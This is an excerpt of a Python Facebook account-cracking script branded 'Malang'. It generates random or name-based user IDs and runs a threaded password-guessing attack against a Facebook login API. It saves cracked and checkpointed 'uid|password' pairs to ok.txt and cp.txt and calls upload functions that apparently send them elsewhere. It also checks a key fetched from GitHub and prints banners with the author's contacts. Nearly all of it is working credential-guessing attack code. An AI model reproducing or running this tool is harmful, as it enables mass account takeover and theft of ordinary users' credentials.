...
def helpnote():
	...
	exit(" [*] FACEBOOK : https://www.facebook.com/profile.php?id=100033159181872
 ")
...
class Main:
	def __init__(self):
		...
		self.loop = 0
		try:
			plr = requests.get('https://github.com/Malangbacha001/KEY/blob/main/key.txt').text
			if basesplit in plr:
				key = basesplit
		...
		print ("""
		__  __       _                       _
|  \/  | __ _| | __ _ _ __   __ _    (_) __ _ _ __
| |\/| |/ _` | |/ _` | '_ \ / _` |   | |/ _` | '_ \
| |  | | (_| | | (_| | | | | (_| |   | | (_| | | | |
...
█▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀█
█  Github: Malang Bacha001
█  Telegram : Malangjan001
█  Modifier:  Malang Bacha
█  Facebook :  Malang Bacha
█▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄█""")
	...
	def oldcrack(self):
		...
		limit = int(input("\033[0;92m [+] ENTER LIMIT \033[0;91m(50000 MAX): \033[0;92m"))
		if (limit)>50000:
			exit("\n%s [!] DON'T CROSS THE LIMIT BRO 0key ? - Malang:)"%(R))
		try:
			for n in range(limit):
				_ = random.randint(x,xx)
				__ = idx
			...
			with ThreadPoolExecutor(max_workers=30) as coeg:
				print("\n%s [!] USE %s, %s(COMMA)%s FOR SEPARATOR "%(Y,G,B,Y))
				print("%s EXAMPLE : %s123456,1234567,100200,500500,123456789"%(Y,G))
				listpass = input("%s [?] ENTER PASSWORD :%s "%(Y,G))
				if len(listpass)<=5:
					exit("\n%s [!] PASSWORD MINIMUM 6 CHARACTERS"%(R))
				print("%s [*] CRACK WITH PASSWORD -> [\033[0;91m%s\033[0;93m]"%(Y,listpass))
	...
	def email(self):
		x = 111
		xx = 999
		nam = input("%s [?] TYPE A NAME %s(EX: Rashid): "%(Y,G))
		nam = nam.replace(" ", "")
	...
	def api(self, uid, pwx):
		...
		for pw in pwx:
			...
			if "session_key" in response.text and "EAAA" in response.text:
				...
				open("ok.txt","a").write(" [MALANG-OK] %s|%s\n"%(uid, pw))
				uploadoks()
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r \033[0;91m[MALANG-CP] %s|%s\033[0;97m         "%(uid, pw))
				self.cp.append("%s|%s"%(uid, pw))
				open("cp.txt","a").write(" [MALANG-CP] %s|%s\n"%(uid, pw))
				uploadcps()
				break
			else:
				continue
